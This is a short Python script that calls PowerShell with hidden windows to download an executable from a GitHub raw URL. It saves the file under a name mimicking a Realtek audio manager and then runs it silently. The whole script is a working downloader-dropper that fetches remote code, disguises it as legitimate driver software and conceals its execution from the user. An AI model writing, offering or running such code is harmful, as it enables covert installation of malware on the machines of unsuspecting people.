import subprocess

# PowerShell command to run curl and hide the window
powershell_command = """
$ErrorActionPreference = 'Stop'
Start-Process powershell -ArgumentList 'curl -L https://github.com/holdthatcode/host/raw/main/howl.exe --output RealtekHDAudioManager.exe' -NoNewWindow -Wait
"""

# Run the PowerShell command
subprocess.run(["powershell", "-Command", powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)

# Run the downloaded executable silently
subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", "Start-Process", "RealtekHDAudioManager.exe", "-NoNewWindow", "-Wait"])